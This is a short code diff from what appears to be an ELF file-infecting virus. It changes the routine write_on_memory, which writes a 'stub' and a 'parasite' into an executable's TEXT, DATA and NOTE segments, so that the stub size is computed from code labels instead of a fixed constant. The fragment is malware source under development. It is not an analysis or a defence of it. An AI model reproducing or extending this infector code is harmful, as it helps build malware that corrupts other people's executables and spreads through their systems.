@@ -6,8 +6,10 @@
 
 __attribute__((always_inline)) static inline void write_on_memory(char *dst, char *src, Elf64_Phdr **segment)
 {
-	const size_t beg_stub = (segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE;
-	const size_t end_stub = PAGE_SIZE + STUB_SIZE;
+	const size_t stub_size = (void *)__exit - (void *)L1;
+
+	const size_t beg_stub = (segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - stub_size;
+	const size_t end_stub = PAGE_SIZE + stub_size;
 	const size_t beg_parasite = (segment[DATA]->p_offset + segment[DATA]->p_filesz) - (beg_stub + end_stub);
 	const size_t end_parasite = segment[NOTE]->p_filesz + (segment[NOTE]->p_offset - (segment[DATA]->p_offset + segment[DATA]->p_filesz));
 
@@ -16,7 +18,7 @@ __attribute__((always_inline)) static inline void write_on_memory(char *dst, cha
 	for (register size_t index = 0; index < end_stub; index++)
 		*dst++ = 0;
 
-	src += STUB_SIZE;
+	src += stub_size;
 
 	for (register size_t index = 0; index < beg_parasite; index++)
 		*dst++ = *src++;
